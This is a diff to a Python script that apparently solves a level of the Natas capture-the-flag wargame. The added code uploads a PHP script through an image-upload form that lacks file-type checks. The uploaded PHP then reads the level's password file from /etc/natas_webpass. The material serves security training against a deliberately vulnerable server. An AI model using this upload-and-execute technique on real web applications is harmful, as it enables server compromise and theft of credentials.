@@ -22,7 +22,6 @@ print(f'{div_content}\n')
 response = session.get(URL + 'index-source.html')
 source = html.unescape(response.text).replace('<br />', '')
 print(source)
-
 """
 <? 
 
@@ -81,3 +80,23 @@ Choose a JPEG to upload (max 1KB):<br/>
 </form>
 <? } ?> 
 """
+
+
+# since there is no validation on whether the file an image, we 
+# can simply upload a php script to the server
+php_script = """
+<?
+echo file_get_contents('/etc/natas_webpass/natas13'); 
+?>
+"""
+data = {
+    "MAX_FILE_SIZE" : "1000",
+    "filename" : "script.php",
+    "submit" : "submit"
+}
+files = {
+    "uploadedfile" : bytearray(php_script, 'utf-8')
+}
+# reference: https://stackoverflow.com/questions/22567306/python-requests-file-upload
+response = session.post(URL + 'index.php', files=files, data=data)
+print(response.text)
